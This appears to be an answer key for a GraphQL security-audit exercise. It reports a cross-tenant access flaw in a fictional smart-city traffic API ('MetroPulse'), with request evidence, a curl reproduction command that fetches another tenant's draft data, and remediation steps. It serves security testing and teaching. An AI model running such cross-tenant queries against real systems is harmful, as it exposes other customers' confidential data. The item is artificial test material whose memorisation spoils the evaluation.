# Expected Response

## System
- Domain: Smart City / Traffic Management
- System: MetroPulse Traffic Orchestration
- Example ID: GQL-0154

## Priority Findings

### Finding 1: Smart City Traffic — Draft Traffic Config Exposed via Cross-Tenant Intersection Query (Pattern 10.5)
**Severity:** High
**Category:** Single-User / Draft / Non-Published Resource Access

**Summary:**
Per §5.0 (Pattern 10.5 — draft/non-published resource access): The `getIntersection` resolver fetches by `nodeId` without enforcing ownership, enabling access to draft or unpublished traffic configuration data. An attacker from `tenant-3963` queried `getIntersection(id: "I-2154")` and received smart city traffic data belonging to `tenant-24ec`, including `CONFIDENTIAL-396324ec`. In Smart City / Traffic Management, this exposes draft signal timing plans, intersection control configurations, and planned infrastructure changes before deployment.

**Evidence from HAR:**
- Request: `POST https://api.metropulse-traffic-o.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-3963`
- Query: `getIntersection(id: "I-2154") { nodeId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`: `tenantId: "tenant-24ec"`, `ownerId: "other-user-396324ec"`, `sensitiveField: "CONFIDENTIAL-396324ec"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-396324ec`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 10.5 | getIntersection, draft config access |
| HAR request | x-tenant-id | Attacker tenant-3963 |
| HAR response | tenantId | Cross-tenant traffic config tenant-24ec |
| HAR response | sensitiveField | CONFIDENTIAL-396324ec |

## Steps to Reproduce

### Step 1 — getIntersection cross-tenant (HAR)
```bash
curl -s -X POST https://api.metropulse-traffic-o.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-3963" \
  -d '{"query": "query { getIntersection(id: \"I-2154\") { nodeId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** `tenant-24ec` traffic config data returned. **Secure:** FORBIDDEN.

## Remediation
1. `getIntersection` resolver: `WHERE node_id=$id AND tenant_id=$jwt.tenantId`.
2. Draft-state resources: require `owner` role and explicit publish action.
3. Redis cache key: `intersection:{tenantId}:{nodeId}`.
